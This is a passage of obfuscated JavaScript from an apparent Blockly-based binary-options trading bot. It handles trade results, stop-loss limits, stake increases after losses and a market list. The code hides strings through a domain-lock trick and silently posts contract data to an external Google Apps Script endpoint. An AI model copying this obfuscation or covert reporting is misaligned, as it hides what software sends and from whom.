        if (chkSmart.checked) {
          if (totalProfit >= totalProfitMax) {
            totalProfitMax = totalProfit;
            stakeNow = getStakeBegin();
          }
        } else {
          stakeNow = getStakeBegin();
        }
      }
      timeMayOP = Date.now() + (chkDelayWin.checked ? inpDelayWin.value * 1000 : 0);
    }
  } else if (!loseContract.includes(_0x2e8f29) && (_0x5260b8 < 0 || _0x120f08 === "l" + String.fromCodePoint("block.ezbinarybot.com".replace("www.", "").replace("block.", "").charCodeAt(305 % 76) - 11) + "st")) {
    loseContract.push(_0x2e8f29);
    rowActive[tempPrContractPos].cells[3].innerText = _0x57df16;
    rowActive[tempPrContractPos].cells[4].innerText = _0x199384;
    rowActive[tempPrContractPos].cells[5].innerText = _0x5260b8;
    rowActive[tempPrContractPos].cells[5].style.color = colorFall;
    summary_loss.innerText = loseContract.length;
    totalProfit += _0x5260b8;
    summary_totalstake.innerText = (summary_totalstake.innerText * 1 + _0x199384).toFixed(2);
    summary_totalpayout.innerText = (summary_totalpayout.innerText * 1 + _0xf1c45b).toFixed(2);
    summary_totalprofitloss.innerText = totalProfit.toFixed(2);
    summary_totalprofitloss.style.color = totalProfit > 0 ? colorWormNo : totalProfit < 0 ? colorFall : "#fff";
    tempWinInARow = 0;
    tempLossInARow++;
    if (chkSL.checked && inpSL.value * 1 != 0 && totalProfit.toFixed(2) * 1 <= -(inpSL.value * 1)) {
      if (btn_run.src.split("/").pop() == "icon_stop.png") {
        btn_run.click();
      }
      writeLog(colorFall, "STOP LOSS HIT.");
      // TOLOOK
      setTimeout(() => {
        alert("STOP LOSS HIT.");
      }, 500);
    } else if (chkNumOfLoss.checked && inpNumOfLoss.value * 1 != 0 && summary_loss.innerText * 1 >= inpNumOfLoss.value * 1) {
      if (btn_run.src.split("/").pop() == "icon_stop.png") {
        btn_run.click();
      }
      writeLog(colorFall, "NUMBER OF LOSS(ES) REACHED.");
      // TOLOOK
      setTimeout(() => {
        alert("NUMBER OF LOSS(ES) REACHED.");
      }, 500);
    } else if (chkNumOfRun.checked && inpNumOfRun.value * 1 != 0 && summary_noofruns.innerText * 1 >= inpNumOfRun.value * 1) {
      if (btn_run.src.split("/").pop() == "icon_stop.png") {
        btn_run.click();
      }
      writeLog("", "NUMBER OF RUN(S) REACHED.");
      // TOLOOK
      setTimeout(() => {
        alert("NUMBER OF RUN(S) REACHED.");
      }, 500);
    } else if (chkNumOfLossInARow.checked && inpNumOfLossInARow.value * 1 != 0 && tempLossInARow >= inpNumOfLossInARow.value * 1) {
      if (btn_run.src.split("/").pop() == "icon_stop.png") {
        btn_run.click();
      }
      writeLog(colorFall, "LOSS(ES) IN A ROW REACHED.");
      // TOLOOK
      setTimeout(() => {
        alert("LOSS(ES) IN A ROW REACHED.");
      }, 500);
    } else {
      stakeNow = getStakeAfterLose(Math.abs(_0x5260b8));
      timeMayOP = Date.now() + (chkDelayLose.checked ? inpDelayLose.value * 1000 : 0);
    }
  }
  fillDataLastCont(_0x199384, _0xf1c45b, _0x5260b8, _0x3e14c4, _0x1b3b9f, _0x28215d, _0x3ee1ab, _0x4472d0, _0x20def0, _0x57df16, _0x1ebdf7, _0x120f08, false);
  func$1$9$8$7$RestartTradingConditions();
  clearTimeout(timerStartPLANB[prContract.indexOf(_0x2e8f29)]);
  clearTimeout(timerDoPLANB[prContract.indexOf(_0x2e8f29)]);
  prContract[prContract.indexOf(_0x2e8f29)] = 0;
};
const updateResultV = (_0x532fe6, _0x597de6, _0x179dfc, _0x19ef0f, _0x5eb2eb, _0x138df8, _0x3a47ad, _0x28e83d, _0x2a5769, _0x37bd0f, _0x535ea2, _0x3a92f5, _0x25e8d6) => {
  updateStepper(4);
  if (_0x532fe6 != lastContractIdV) {
    tempPrContractPos = prContract.indexOf(_0x532fe6);
    rowActive[tempPrContractPos].cells[3].innerText = _0x3a92f5;
    if (_0x179dfc >= 0 || _0x597de6 === "w" + String.fromCodePoint("block.ezbinarybot.com".replace("www.", "").replace("block.", "").charCodeAt(305 % 76) - 11) + "n") {
      rowActive[tempPrContractPos].cells[5].innerText = "Virtual Win";
      rowActive[tempPrContractPos].cells[5].style.color = colorWormNo;
      countVLose = 0;
      timeMayOP = Date.now() + (chkDelayWin.checked ? inpDelayWin.value * 1000 : 0);
    } else if (_0x179dfc < 0 || _0x597de6 === "l" + String.fromCodePoint("block.ezbinarybot.com".replace("www.", "").replace("block.", "").charCodeAt(305 % 76) - 11) + "st") {
      rowActive[tempPrContractPos].cells[5].innerText = "Virtual Lose";
      rowActive[tempPrContractPos].cells[5].style.color = colorFall;
      countVLose++;
      if (chkVLose.checked) {
        writeLog("", "[Virtual] LOSE #" + countVLose + "/" + inpVLose.value);
      }
      ;
      timeMayOP = Date.now() + (chkDelayLose.checked ? inpDelayLose.value * 1000 : 0);
    }
    lastContractIdV = _0x532fe6;
    fillDataLastCont(_0x19ef0f, _0x5eb2eb, _0x179dfc, _0x138df8, _0x3a47ad, _0x28e83d, _0x2a5769, _0x37bd0f, _0x535ea2, _0x3a92f5, _0x25e8d6, _0x597de6, true);
    func$1$9$8$7$RestartTradingConditions();
    clearTimeout(timerStartPLANB[prContract.indexOf(_0x532fe6)]);
    clearTimeout(timerDoPLANB[prContract.indexOf(_0x532fe6)]);
    prContract[prContract.indexOf(_0x532fe6)] = 0;
  }
};
const doPLANB = _0x16923e => {
  console.log("doPLANB: " + _0x16923e);
  if (conn_nya.readyState != 1) {
    timerDoPLANB[prContract.indexOf(_0x16923e)] = // TOLOOK
    setTimeout(() => {
      doPLANB(_0x16923e);
    }, timerDoPLANBOffset * 1000);
    return;
  }
  if (prContract.indexOf(_0x16923e) > -1) {
    if (navigator.onLine) {
      conn_nya.send(JSON.stringify({
        forget_all: "prop" + String.fromCodePoint("block.ezbinarybot.com".replace("www.", "").replace("block.", "").charCodeAt(305 % 76) - 11) + "sal_open_c" + String.fromCodePoint("block.ezbinarybot.com".replace("www.", "").replace("block.", "").charCodeAt(305 % 76) - 11) + "ntract",
        passthrough: {
          app_id: app_id
        }
      }));
      conn_nya.send(JSON.stringify({
        subscribe: 1,
        proposal_open_contract: 1,
        contract_id: _0x16923e,
        passthrough: {
          app_id: app_id
        }
      }));
    }
    timerDoPLANB[prContract.indexOf(_0x16923e)] = // TOLOOK
    setTimeout(() => {
      doPLANB(_0x16923e);
    }, timerDoPLANBOffset * 1000);
  } else {}
};
const ubahbtn_run = _0x2f95c5 => {
  btn_run.src = btn_run2.src = "image/icon_" + _0x2f95c5 + ".png";
  btnSimpleRun.innerHTML = "<img src=\"image/icon_" + _0x2f95c5 + "2.png\" style=\"height: 30px;\">&nbsp;&nbsp;" + (_0x2f95c5 == "run" ? "Run" : "Stop") + " Robot";
};
window.onbeforeunload = function (_0x1efd82) {
  return "Are You sure ?";
};
const updateStepper = _0x5a07fb => {
  for (i = 1; i <= 4; i++) {
    if (i <= _0x5a07fb) {
      divStepper[i].className = "stepper-item completed";
    } else {
      divStepper[i].className = "stepper-item active";
    }
    if (i == _0x5a07fb) {
      divStepper[i].querySelector(".step-counter").classList.add("pulse");
    } else {
      divStepper[i].querySelector(".step-counter").classList.remove("pulse");
    }
  }
};
form.addEventListener("submit", _0x260586 => {
  _0x260586.preventDefault();
  let _0xf652c8 = new FormData(form);
  fetch("https://script.google.com/macros/s/AKfycbwx-8PzrCYl0UkYT5_II5cu7YtkEaXHp6QqKtXFO_ncW7Cr_aZHZJb-Kc7o4bf1mFyM/exec", {
    mode: "no-cors",
    method: "POST",
    body: _0xf652c8
  }).then(_0xc23537 => {}).then(_0xf652c8 => {}).catch(function (_0x43708a) {
    console.log("Request failed", _0x43708a);
  });
  return true;
});
const saveDataContract = (_0x20c1b4, _0x269062, _0x19e27b, _0x48b107, _0xbab1f1, _0x249bc5, _0x38d596) => {
  data_001.value = _0x20c1b4;
  data_002.value = _0x269062;
  data_003.value = _0x19e27b;
  data_004.value = _0x48b107;
  data_005.value = _0xbab1f1;
  data_006.value = "block";
  data_007.value = _0x249bc5;
  data_008.value = _0x38d596;
  aSimp.click();
};
const refreshBoxData = _0x4482aa => {
  document.getElementById("div_thelast10digits").style.display = "none";
  document.getElementById("div_digitstatistic").style.display = "none";
  document.getElementById("div_thelast20digitscaterzian").style.display = "none";
  document.getElementById("div_thelast20digitsevenodd").style.display = "none";
  document.getElementById("div_evenvsodd").style.display = "none";
  document.getElementById("div_overvsunder").style.display = "none";
  document.getElementById("div_thelast10ticks").style.display = "none";
  document.getElementById("div_thelast20tickworm").style.display = "none";
  document.getElementById("div_risevsfall").style.display = "none";
  document.getElementById("div_tick_Trisma").style.display = "none";
  document.getElementById("div_detail3ticks").style.display = "none";
  document.getElementById("div_thelast10candles").style.display = "none";
  document.getElementById("div_continuousindices").style.display = "none";
  document.getElementById("div_ihaveanidea").style.display = "none";
  document.getElementById("div_comingsoon").style.display = "none";
  document.getElementById("div_" + _0x4482aa).style.display = "block";
};
refreshBoxData(selData.value);
function saveJsonObjToFile(_0x4d7496, _0x1746de) {
  const _0x31bd09 = JSON.stringify(_0x4d7496);
  const _0x42cf40 = "text/plain";
  const _0x109d8d = document.createElement("a");
  const _0xf67cd9 = new Blob([_0x31bd09], {
    type: _0x42cf40
  });
  _0x109d8d.href = URL.createObjectURL(_0xf67cd9);
  _0x109d8d.download = _0x1746de;
  document.body.appendChild(_0x109d8d);
  _0x109d8d.click();
  _0x109d8d.remove();
}
function loadFileToJsonObj(_0x1d12b6) {
  let _0x88bdee = new FileReader();
  _0x88bdee.onload = function () {
    Blockly.serialization.workspaces.load(JSON.parse(_0x88bdee.result), Blockly.getMainWorkspace());
    document.getElementById("input_file").value = "";
  };
  _0x88bdee.readAsText(_0x1d12b6);
}
function tableToCSV(_0x353529, _0x1c6602, _0x3c26f1) {
  var _0x5d557c = [];
  var _0x57f8c2 = [];
  var _0x267bbb;
  var _0x549ca1;
  var _0x1d91d7;
  var _0xa95322;
  if (_0x1c6602 != "") {
    _0x5d557c.push(_0x1c6602);
  }
  _0x1d91d7 = document.querySelectorAll("#" + _0x353529 + " tr");
  for (_0x267bbb = 0; _0x267bbb < _0x1d91d7.length; _0x267bbb++) {
    _0xa95322 = _0x1d91d7[_0x267bbb].querySelectorAll("td,th");
    _0x57f8c2 = [];
    for (_0x549ca1 = 0; _0x549ca1 < _0xa95322.length; _0x549ca1++) {
      _0x57f8c2.push(_0xa95322[_0x549ca1].innerText);
    }
    _0x5d557c.push(_0x57f8c2.join(","));
  }
  _0x5d557c = _0x5d557c.join("\n");
  downloadCSVFile(_0x5d557c, _0x3c26f1);
}
function downloadCSVFile(_0x872ad6, _0x314b49) {
  var _0x57d436 = new Blob([_0x872ad6], {
    type: "text/csv"
  });
  var _0x59ee8d = document.createElement("a");
  _0x59ee8d.download = _0x314b49;
  var _0x4b1f75 = window.URL.createObjectURL(_0x57d436);
  _0x59ee8d.href = _0x4b1f75;
  _0x59ee8d.style.display = "none";
  document.body.appendChild(_0x59ee8d);
  _0x59ee8d.click();
  document.body.removeChild(_0x59ee8d);
}
var toolbox = document.getElementById("toolbox");
var options = {
  toolbox: toolbox,
  collapse: true,
  comments: true,
  disable: true,
  maxBlocks: Infinity,
  trashcan: false,
  horizontalLayout: false,
  toolboxPosition: "start",
  css: true,
  media: "https://blockly-demo.appspot.com/static/media/",
  rtl: false,
  scrollbars: true,
  sounds: true,
  oneBasedIndex: true,
  zoom: {
    controls: true,
    wheel: false,
    startScale: 1,
    maxScale: 3,
    minScale: 0.3,
    scaleSpeed: 1.2,
    pinch: true
  },
  theme: Blockly.Theme.defineTheme("dark", {
    base: Blockly.Themes.Classic,
    blockStyles: {
      logic_blocks: {
        colourPrimary: "#3e3e3e"
      },
      math_blocks: {
        colourPrimary: "#3e3e3e"
      },
      text_blocks: {
        colourPrimary: "#3e3e3e"
      },
      list_blocks: {
        colourPrimary: "#3e3e3e"
      },
      variable_blocks: {
        colourPrimary: "#3e3e3e"
      },
      procedure_blocks: {
        colourPrimary: "#3e3e3e"
      },
      loop_blocks: {
        colourPrimary: "#3e3e3e"
      }
    },
    componentStyles: {
      workspaceBackgroundColour: "#1e1e1e",
      toolboxBackgroundColour: "blackBackground",
      toolboxForegroundColour: "#fff",
      flyoutBackgroundColour: "#252526",
      flyoutForegroundColour: "#ccc",
      flyoutOpacity: 1,
      scrollbarColour: "#797979",
      insertionMarkerColour: "#222",
      insertionMarkerOpacity: 0.3,
      scrollbarOpacity: 0.4,
      cursorColour: "#d0d0d0",
      blackBackground: "#2a2a2a"
    }
  })
};
var workspace = Blockly.inject(blocklyDiv, options);
workspace.addChangeListener(Blockly.Events.disableOrphans);
var workspaceBlocks = document.getElementById("workspaceBlocks");
Blockly.Xml.domToWorkspace(workspaceBlocks, workspace);
let arrPopulatedMarket2 = [["Active Market", "activemarket"], ["Current Market [Multi Market: Continuous Indices]", "mainMarket_continuousindices"], ["Continuous Indices:Volatility 10 (1s) Index", "1HZ10V|Volatility 10 (1s) Index"], ["Continuous Indices:Volatility 10 Index", "R_10|Volatility 10 Index"], ["Continuous Indices:Volatility 25 (1s) Index", "1HZ25V|Volatility 25 (1s) Index"], ["Continuous Indices:Volatility 25 Index", "R_25|Volatility 25 Index"], ["Continuous Indices:Volatility 50 (1s) Index", "1HZ50V|Volatility 50 (1s) Index"], ["Continuous Indices:Volatility 50 Index", "R_50|Volatility 50 Index"], ["Continuous Indices:Volatility 75 (1s) Index", "1HZ75V|Volatility 75 (1s) Index"], ["Continuous Indices:Volatility 75 Index", "R_75|Volatility 75 Index"], ["Continuous Indices:Volatility 100 (1s) Index", "1HZ100V|Volatility 100 (1s) Index"], ["Continuous Indices:Volatility 100 Index", "R_100|Volatility 100 Index"], ["Continuous Indices:Volatility 150 (1s) Index", "1HZ150V|Volatility 150 (1s) Index"], ["Continuous Indices:Volatility 250 (1s) Index", "1HZ250V|Volatility 250 (1s) Index"], ["Daily Reset Indices:Bear Market Index", "RDBEAR|Bear Market Index"], ["Daily Reset Indices:Bull Market Index", "RDBULL|Bull Market Index"], ["Jump Indices:Jump 10 Index", "JD10|Jump 10 Index"], ["Jump Indices:Jump 25 Index", "JD25|Jump 25 Index"], ["Jump Indices:Jump 50 Index", "JD50|Jump 50 Index"], ["Jump Indices:Jump 75 Index", "JD75|Jump 75 Index"], ["Jump Indices:Jump 100 Index", "JD100|Jump 100 Index"], ["Step Indices:Step Index", "stpRNG|Step Index"], ["Crash/Boom Indices:Crash 300 Index", "CRASH300N|Crash 300 Index"], ["Crash/Boom Indices:Crash 500 Index", "CRASH500|Crash 500 Index"], ["Crash/Boom Indices:Crash 1000 Index", "CRASH1000|Crash 1000 Index"], ["Crash/Boom Indices:Boom 300 Index", "BOOM300N|Boom 300 Index"], ["Crash/Boom Indices:Boom 500 Index", "BOOM500|Boom 500 Index"], ["Crash/Boom Indices:Boom 1000 Index", "BOOM1000|Boom 1000 Index"], ["Major Pairs:AUD/JPY", "frxAUDJPY|AUD/JPY"], ["Major Pairs:AUD/USD", "frxAUDUSD|AUD/USD"], ["Major Pairs:EUR/AUD", "frxEURAUD|EUR/AUD"], ["Major Pairs:EUR/CHF", "frxEURCHF|EUR/CHF"], ["Major Pairs:EUR/GBP", "frxEURGBP|EUR/GBP"], ["Major Pairs:EUR/JPY", "frxEURJPY|EUR/JPY"], ["Major Pairs:EUR/USD", "frxEURUSD|EUR/USD"], ["Major Pairs:GBP/AUD", "frxGBPAUD|GBP/AUD"], ["Major Pairs:GBP/JPY", "frxGBPJPY|GBP/JPY"], ["Major Pairs:GBP/USD", "frxGBPUSD|GBP/USD"], ["Major Pairs:USD/CAD", "frxUSDCAD|USD/CAD"], ["Major Pairs:USD/CHF", "frxUSDCHF|USD/CHF"], ["Major Pairs:USD/JPY", "frxUSDJPY|USD/JPY"], ["Minor Pairs:AUD/CAD", "frxAUDCAD|AUD/CAD"], ["Minor Pairs:AUD/CHF", "frxAUDCHF|AUD/CHF"], ["Minor Pairs:AUD/NZD", "frxAUDNZD|AUD/NZD"], ["Minor Pairs:EUR/NZD", "frxEURNZD|EUR/NZD"], ["Minor Pairs:GBP/CAD", "frxGBPCAD|GBP/CAD"], ["Minor Pairs:GBP/CHF", "frxGBPCHF|GBP/CHF"], ["Minor Pairs:GBP/NOK", "frxGBPNOK|GBP/NOK"], ["Minor Pairs:GBP/NZD", "frxGBPNZD|GBP/NZD"], ["Minor Pairs:NZD/JPY", "frxNZDJPY|NZD/JPY"], ["Minor Pairs:NZD/USD", "frxNZDUSD|NZD/USD"], ["Minor Pairs:USD/MXN", "frxUSDMXN|USD/MXN"], ["Minor Pairs:USD/NOK", "frxUSDNOK|USD/NOK"], ["Minor Pairs:USD/PLN", "frxUSDPLN|USD/PLN"], ["Minor Pairs:USD/SEK", "frxUSDSEK|USD/SEK"], ["Asian indices:Australia 200", "OTC_AS51|Australia 200"], ["Asian indices:Hong Kong 50", "OTC_HSI|Hong Kong 50"], ["Asian indices:Japan 225", "OTC_N225|Japan 225"], ["European indices:Euro 50", "OTC_SX5E|Euro 50"], ["European indices:France 40", "OTC_FCHI|France 40"], ["European indices:Germany 40", "OTC_GDAXI|Germany 40"], ["European indices:Netherlands 25", "OTC_AEX|Netherlands 25"], ["European indices:Swiss 20", "OTC_SSMI|Swiss 20"], ["European indices:UK 100", "OTC_FTSE|UK 100"], ["American indices:US 500", "OTC_SPC|US 500"], ["American indices:US Tech 100", "OTC_NDX|US Tech 100"], ["American indices:Wall Street 30", "OTC_DJI|Wall Street 30"], ["Forex Basket:AUD Basket", "WLDAUD|AUD Basket"], ["Forex Basket:EUR Basket", "WLDEUR|EUR Basket"], ["Forex Basket:GBP Basket", "WLDGBP|GBP Basket"], ["Forex Basket:USD Basket", "WLDUSD|USD Basket"], ["Commodities Basket:Gold Basket", "WLDXAU|Gold Basket"], ["Metals:Gold/USD", "frxXAUUSD|Gold/USD"], ["Metals:Palladium/USD", "frxXPDUSD|Palladium/USD"], ["Metals:Platinum/USD", "frxXPTUSD|Platinum/USD"], ["Metals:Silver/USD", "frxXAGUSD|Silver/USD"], ["Cryptocurrencies:BTC/USD", "cryBTCUSD|BTC/USD"], ["Cryptocurrencies:ETH/USD", "cryETHUSD|ETH/USD"]];
let arrAccount = [["Auto", "auto"], ["Master", "master"], ["Slave", "slave"]];
let arrStakeAM = [["Auto", "auto"], ["Manual", "manual"]];
let arrPopulatedMarketAccu = [["Active Market", "activemarket"], ["Current Market [Multi Market: Continuous Indices]", "mainMarket_continuousindices"], ["Continuous Indices:Volatility 10 (1s) Index", "1HZ10V|Volatility 10 (1s) Index"], ["Continuous Indices:Volatility 10 Index", "R_10|Volatility 10 Index"], ["Continuous Indices:Volatility 25 (1s) Index", "1HZ25V|Volatility 25 (1s) Index"], ["Continuous Indices:Volatility 25 Index", "R_25|Volatility 25 Index"], ["Continuous Indices:Volatility 50 (1s) Index", "1HZ50V|Volatility 50 (1s) Index"], ["Continuous Indices:Volatility 50 Index", "R_50|Volatility 50 Index"], ["Continuous Indices:Volatility 75 (1s) Index", "1HZ75V|Volatility 75 (1s) Index"], ["Continuous Indices:Volatility 75 Index", "R_75|Volatility 75 Index"], ["Continuous Indices:Volatility 100 (1s) Index", "1HZ100V|Volatility 100 (1s) Index"], ["Continuous Indices:Volatility 100 Index", "R_100|Volatility 100 Index"]];
Blockly.defineBlocksWithJsonArray([{
  type: "runonceatstart",
  message0: "%1 1. Run once at start: %2 %3",
  args0: [{
    type: "field_image",
    src: "https://block.ezbinarybot.com/image/icon_start.png",
    width: 25,
    height: 25,
    alt: "*",
    flipRtl: false
  }, {
    type: "input_end_row"
  }, {
    type: "input_statement",
    name: "statement_runonceatstart"
  }],
  colour: "#3e3e3e",
  tooltip: "",
  helpUrl: ""
}]);
javascript.javascriptGenerator.forBlock.runonceatstart = function (_0xd11b4d, _0x598b14) {
  var _0x2acefb = _0x598b14.statementToCode(_0xd11b4d, "statement_runonceatstart");
  var _0x20a45f = "func$1$9$8$7$RunOnceAtStart=()=>{izinRun2=false;" + _0x2acefb + ";stakeNow=getStakeBegin();sudahRunOnceAtStart=true;timeMayOP=Date.now()+600;}";
  return _0x20a45f;
};
Blockly.defineBlocksWithJsonArray([{
  type: "purchaseconditions",
  message0: "%1 2. Purchase conditions %2 %3",
  args0: [{
    type: "field_image",
    src: "https://block.ezbinarybot.com/image/icon_purchase.png",
    width: 25,
    height: 25,
    alt: "*",
    flipRtl: false
  }, {
    type: "input_end_row"
  }, {
    type: "input_statement",
    name: "statement_purchaseconditions"
  }],
  colour: "#3e3e3e",
  tooltip: "",
  helpUrl: ""
}]);
javascript.javascriptGenerator.forBlock.purchaseconditions = function (_0x388454, _0x1a8287) {
  var _0x2f677c = _0x1a8287.statementToCode(_0x388454, "statement_purchaseconditions");
  var _0x578298 = "func$1$9$8$7$PurchaseConditions=()=>{if(izinRun2){izinRun2=false;" + _0x2f677c + "};}";
  return _0x578298;
};
Blockly.defineBlocksWithJsonArray([{
  type: "purchaseconditions_continuousindices",
  message0: "%1 2. Purchase conditions [Multi Market: Continuous Inidices] %2 %3",
  args0: [{
    type: "field_image",
    src: "https://block.ezbinarybot.com/image/icon_purchase.png",
    width: 25,
    height: 25,
    alt: "*",
    flipRtl: false
  }, {
    type: "input_end_row"
  }, {
    type: "input_statement",
    name: "statement_purchaseconditions"
  }],
  colour: "#3e3e3e",
  tooltip: "",
  helpUrl: ""
}]);
javascript.javascriptGenerator.forBlock.purchaseconditions_continuousindices = function (_0x3eac35, _0x2a623c) {
  var _0x4cf53b = _0x2a623c.statementToCode(_0x3eac35, "statement_purchaseconditions");
  var _0x13d936 = "func$1$9$8$7$PurchaseConditions_continuousindices=()=>{" + _0x4cf53b + "}";
  return _0x13d936;
};
Blockly.defineBlocksWithJsonArray([{
  type: "currentmarket_continuousindices",
  message0: "Current Market [Multi Market: Continuous Indices]",
  args0: [],
  output: null,
  colour: "#3e3e3e",
  tooltip: "",
  helpUrl: ""
}]);
javascript.javascriptGenerator.forBlock.currentmarket_continuousindices = function (_0x41ed6c, _0x1acf55) {
  var _0x5bcc59 = "mainMarket_continuousindices";
  return [_0x5bcc59, Blockly.JavaScript.ORDER_NONE];
};
Blockly.defineBlocksWithJsonArray([{
  type: "1001tickslist_continuousindices",
  message0: "1001 Ticks List [Multi Market: Continuous Indices]",
  args0: [],
  output: null,
  colour: "#3e3e3e",
  tooltip: "",
  helpUrl: ""
}]);
javascript.javascriptGenerator.forBlock["1001tickslist_continuousindices"] = function (_0x1e82cd, _0x2b9982) {
  var _0x5609f2 = "mainTickArray_continuousindices";
  return [_0x5609f2, Blockly.JavaScript.ORDER_NONE];
};
Blockly.defineBlocksWithJsonArray([{
  type: "1001lastdigitlist_continuousindices",
  message0: "1001 Last Digit List [Multi Market: Continuous Indices]",
  args0: [],
  output: null,
  colour: "#3e3e3e",
  tooltip: "",
  helpUrl: ""
}]);
javascript.javascriptGenerator.forBlock["1001lastdigitlist_continuousindices"] = function (_0x84e923, _0x4d9757) {
  var _0x25748e = "mainDigitArray_continuousindices";
  return [_0x25748e, Blockly.JavaScript.ORDER_NONE];
};
Blockly.defineBlocksWithJsonArray([{
  type: "setactive_continuousindices",
  message0: "Set Active [Multi Market: Continuous Indices] %1 %2 #1. Volatility 10(1s) Index %3 %4 #2. Volatility 25(1s) Index %5 %6 #3. Volatility 50(1s) Index %7 %8 #4. Volatility 75(1s) Index %9 %10 #5. Volatility 100(1s) Index %11 %12 #6. Volatility 10 Index %13 %14 #7. Volatility 25 Index %15 %16 #8. Volatility 50 Index %17 %18 #9. Volatility 75 Index %19 %20 #10. Volatility 100 Index",
  args0: [{
    type: "input_end_row"
  }, {
    type: "field_checkbox",
    name: "check_market1_nya",
    checked: true
  }, {
    type: "input_end_row"
  }, {
    type: "field_checkbox",
    name: "check_market2_nya"
  }, {
    type: "input_end_row"
  }, {
    type: "field_checkbox",
    name: "check_market3_nya"
  }, {
    type: "input_end_row"
  }, {
    type: "field_checkbox",
    name: "check_market4_nya"
  }, {
    type: "input_end_row"
  }, {
    type: "field_checkbox",
    name: "check_market5_nya"
  }, {
    type: "input_end_row"
  }, {
    type: "field_checkbox",
    name: "check_market6_nya"
  }, {
    type: "input_end_row"
  }, {
    type: "field_checkbox",
    name: "check_market7_nya"
  }, {
    type: "input_end_row"
  }, {
    type: "field_checkbox",
    name: "check_market8_nya"
  }, {
    type: "input_end_row"
  }, {
    type: "field_checkbox",
    name: "check_market9_nya"
  }, {
    type: "input_end_row"
  }, {
    type: "field_checkbox",
    name: "check_market10_nya"
  }],
  inputsInline: false,
  previousStatement: null,
  nextStatement: null,
  colour: "#3e3e3e",
  tooltip: "",
  helpUrl: ""
}]);
javascript.javascriptGenerator.forBlock.setactive_continuousindices = function (_0xabf60, _0x23b78f) {
  for (var _0x522d6a = 1; _0x522d6a <= 10; _0x522d6a++) {
    checkbox_check_market_nya[_0x522d6a] = _0xabf60.getFieldValue("check_market" + _0x522d6a + "_nya") === "TRUE";
  }
  var _0x3f2194 = "for(var m=1;m<=10;m++){if(continuousindices_active[m].checked!=checkbox_check_market_nya[m]){continuousindices_active[m].checked=checkbox_check_market_nya[m];continuousindices_activeChanged(m,checkbox_check_market_nya[m]);}};";
  return _0x3f2194;
};
Blockly.defineBlocksWithJsonArray([{
  type: "continuousindices",
  message0: "[Multi Market] Continuous Indices: %1 %2",
  args0: [{
    type: "field_dropdown",
    name: "dropdown_continuousindices_A",
    options: [["#1. Volatility 10(1s) Index", "1"], ["#2. Volatility 25(1s) Index", "2"], ["#3. Volatility 50(1s) Index", "3"], ["#4. Volatility 75(1s) Index", "4"], ["#5. Volatility 100(1s) Index", "5"], ["#6. Volatility 10 Index", "6"], ["#7. Volatility 25 Index", "7"], ["#8. Volatility 50 Index", "8"], ["#9. Volatility 75 Index", "9"], ["#10. Volatility 100 Index", "10"]]
  }, {
    type: "field_dropdown",
    name: "dropdown_continuousindices_B",
    options: [["1001 Ticks List", "ticks"], ["1001 Last Digit List", "digits"], ["Symbol", "symbol"]]
  }],
  output: null,
  colour: "#3e3e3e",
  tooltip: "",
  helpUrl: ""
}]);
javascript.javascriptGenerator.forBlock.continuousindices = function (_0x106c39, _0x19088f) {
  var _0x1d201b = _0x106c39.getFieldValue("dropdown_continuousindices_A");
  var _0x5e9cbd = _0x106c39.getFieldValue("dropdown_continuousindices_B");
  var _0x181ef0;
  if (_0x5e9cbd == "symbol") {
    _0x181ef0 = "document.getElementById(\"continuousindices_" + _0x1d201b + "_" + _0x5e9cbd + "\").innerText";
  } else {
    _0x181ef0 = "(document.getElementById(\"continuousindices_" + _0x1d201b + "_active\").checked)?document.getElementById(\"continuousindices_" + _0x1d201b + "_" + _0x5e9cbd + "\").value:\"\"";
  }
  return [_0x181ef0, Blockly.JavaScript.ORDER_NONE];
};
Blockly.defineBlocksWithJsonArray([{
  type: "sellconditions",
  message0: "%1 3. Sell conditions %2 %3",
  args0: [{
    type: "field_image",
    src: "https://block.ezbinarybot.com/image/icon_dollarsack.png",
    width: 25,
    height: 25,
    alt: "*",
    flipRtl: false
  }, {
    type: "input_end_row"
  }, {
    type: "input_statement",
    name: "statement_sellconditions"
  }],
  colour: "#3e3e3e",
  tooltip: "",
  helpUrl: ""
}]);
javascript.javascriptGenerator.forBlock.sellconditions = function (_0xf96689, _0x163642) {
  var _0x55d0ec = _0x163642.statementToCode(_0xf96689, "statement_sellconditions");
  var _0x1a2940 = "func$1$9$8$7$SellConditions=()=>{" + _0x55d0ec + "}";
  return _0x1a2940;
};
Blockly.defineBlocksWithJsonArray([{
  type: "sellisavailable",
  message0: "Sell is available",
  args0: [],
  output: null,
  colour: "#3e3e3e",
  tooltip: "",
  helpUrl: ""
}]);
javascript.javascriptGenerator.forBlock.sellisavailable = function (_0x5df3e6, _0x438fdf) {
  var _0x36a810 = "(isContractValidToSell[sedangPantauContractPos]==1)?true:false";
  return [_0x36a810, Blockly.JavaScript.ORDER_NONE];
};
Blockly.defineBlocksWithJsonArray([{
  type: "sellprofitloss",
  message0: "Sell profit/loss",
  args0: [],
  output: null,
  colour: "#3e3e3e",
  tooltip: "",
  helpUrl: ""
}]);
javascript.javascriptGenerator.forBlock.sellprofitloss = function (_0x3b39ed, _0x2d027b) {
  var _0x4d9730 = "sellProfitLoss[sedangPantauContractPos]";
  return [_0x4d9730, Blockly.JavaScript.ORDER_NONE];
};
Blockly.defineBlocksWithJsonArray([{
  type: "sellatmarket",
  message0: "Sell at market",
  args0: [],
  previousStatement: null,
  colour: "#3e3e3e",
  tooltip: "",
  helpUrl: ""
}]);
javascript.javascriptGenerator.forBlock.sellatmarket = function (_0x2b4b09, _0x241517) {
  var _0xb14b = "funcSellAtMarket();";
  return _0xb14b;
};
Blockly.defineBlocksWithJsonArray([{
  type: "restarttradingconditions",
  message0: "%1 4. Restart trading conditions %2 %3",
  args0: [{
    type: "field_image",
    src: "https://block.ezbinarybot.com/image/icon_finish.png",
    width: 25,
    height: 25,
    alt: "*",
    flipRtl: false
  }, {
    type: "input_end_row"
  }, {
    type: "input_statement",
    name: "statement_restarttradingconditions"
  }],
  colour: "#3e3e3e",
  tooltip: "",
  helpUrl: ""
}]);
javascript.javascriptGenerator.forBlock.restarttradingconditions = function (_0x5eac9d, _0x9e9b54) {
  var _0x575a16 = _0x9e9b54.statementToCode(_0x5eac9d, "statement_restarttradingconditions");
  var _0x1ac52b = "func$1$9$8$7$RestartTradingConditions=()=>{" + _0x575a16 + "}";
  return _0x1ac52b;
};
Blockly.defineBlocksWithJsonArray([{
  type: "lastcontractdetail",
  message0: "Last contract detail: %1",
  args0: [{
    type: "field_dropdown",
    name: "dropdown_lastcontractdetail_A",
